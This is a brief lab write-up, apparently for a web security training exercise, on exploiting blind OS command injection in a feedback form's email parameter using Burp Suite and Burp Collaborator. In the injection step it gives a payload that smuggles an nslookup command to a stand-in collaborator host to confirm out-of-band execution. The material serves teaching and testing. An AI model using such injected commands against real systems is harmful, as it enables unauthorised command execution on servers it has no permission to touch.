Description:
The application contains a blind OS command injection vulnerability in the feedback function.
The command is executed asynchronously and has no visible effect on the response.
However, it is possible to trigger out-of-band (OOB) interactions with an external service.

Objective:
-Trigger a DNS request to Burp Collaborator
-Confirm command execution

Tools Used:
-Burp Suite (Proxy, Collaborator)

Exploitation Steps
1️-Intercept Request
-Go to the Feedback form
-Submit any data
-Intercept the request using Burp Suite

2️-Identify Vulnerable Parameter
-Locate parameter:
email

3️-Inject Payload
-Modify the parameter:
email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||

4️-Insert Collaborator Payload
-Right-click → Insert Collaborator Payload
-Replace BURP-COLLABORATOR-SUBDOMAIN with generated domain

5️-Send Request
-Forward the request

6️-Check for Interaction
-Go to Burp Collaborator tab
-Click Poll now

You may need to wait a few seconds (asynchronous execution)

Result:
-Received DNS interaction from target server
-Successfully confirmed blind command execution
